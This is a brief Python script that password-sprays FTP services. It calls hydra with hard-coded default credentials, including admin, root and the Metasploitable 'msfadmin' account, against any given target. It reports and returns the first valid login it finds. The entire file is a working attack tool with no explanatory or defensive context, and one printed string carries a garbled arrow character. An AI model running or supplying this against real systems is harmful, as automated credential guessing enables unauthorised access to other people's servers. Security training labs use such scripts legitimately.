import subprocess
from colorama import Fore, Style

COMMON_USERS = ["admin", "root", "msfadmin"]
COMMON_PASSWORDS = ["admin", "password", "msfadmin", "root"]

def spray_ftp(target):
    print("[+] Starting FTP password spray")

    for user in COMMON_USERS:
        for password in COMMON_PASSWORDS:
            cmd = [
                "hydra",
                "-l", user,
                "-p", password,
                f"ftp://{target}",
                "-t", "1",
                "-f"
            ]

            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if "login:" in result.stdout.lower():
                print(Fore.YELLOW + Style.BRIGHT +
                        f"[!!!] VALID CREDENTIAL FOUND â†’ {user}:{password}" +
                        Style.RESET_ALL)
                return {
                    "service": "ftp",
                    "username": user,
                    "password": password
                }

    return None
